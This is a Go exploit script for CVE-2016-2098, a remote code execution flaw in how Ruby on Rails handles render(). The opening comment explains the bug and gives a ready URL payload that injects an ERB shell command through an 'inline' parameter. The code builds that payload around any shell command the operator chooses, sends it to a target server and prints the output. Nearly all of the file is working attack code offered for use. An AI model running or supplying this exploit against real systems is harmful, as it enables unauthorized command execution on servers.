package main
/*
    *****************************************
    CVE-2016-2098 - RubyOnrails Vulnerability
    *****************************************

This vulnerability lies in the way Ruby-On-Rails handles the function render() to generate web-content.
You can exploit this function to get remote code execution by supplying inline to a vulnerable parameter.

Example:
    http://vulnerable.lan/pages?id=1

To attack the following url you might use:
    http://vulnerable.lan/pages?id[inline]=<%25= %25x(SHELLCOMMANDHERE) %25>

This would cause SHELLCOMMANDHERE to be executed in the remote server at shell level.

This exploit script was written by zc00l at 09/02/2018 - 13:42

This code is authored by ANDRE LUIS ALBINO DE MORAES MARQUES - @zc00l - andre.marques@fatec.sp.gov.br
*/

import (
    "fmt"
    "net/http"
    "net/url"
    "flag"
    "io/ioutil"
    "os"
)

var target = flag.String("target", "", "Vulnerable web-server page")
var parameter = flag.String("parameter", "", "Vulnerable parameter")
var command = flag.String("command", "id", "Command to be executed in the remote target")

func exploit(url string) {
    resp, err := http.Get(url)
    if err != nil {
        fmt.Printf("\033[091m[!]\033[0m Error sending request: %s\n", err)
        os.Exit(1)
    }
    defer resp.Body.Close()
    content, err := ioutil.ReadAll(resp.Body)
    println(string(content))
}

func header() {
    fmt.Printf("zc00l exploit to get RCE in CVE-2016-2098\n")
}

func main() {
    header()
    flag.Parse()
    println("\033[092m[+]\033[0m Vulnerable page set to: ", *target)
    println("\033[092m[+]\033[0m Vulnerable parameter set to: ", *parameter)
    println("\033[092m[+]\033[0m Command to be executed: ", *command)

    var payload = url.PathEscape("[inline]=<%= %x("+*command+") %>")
    var exploit_url = fmt.Sprintf("%s?%s%s", *target, *parameter, payload)
    exploit(exploit_url)
}
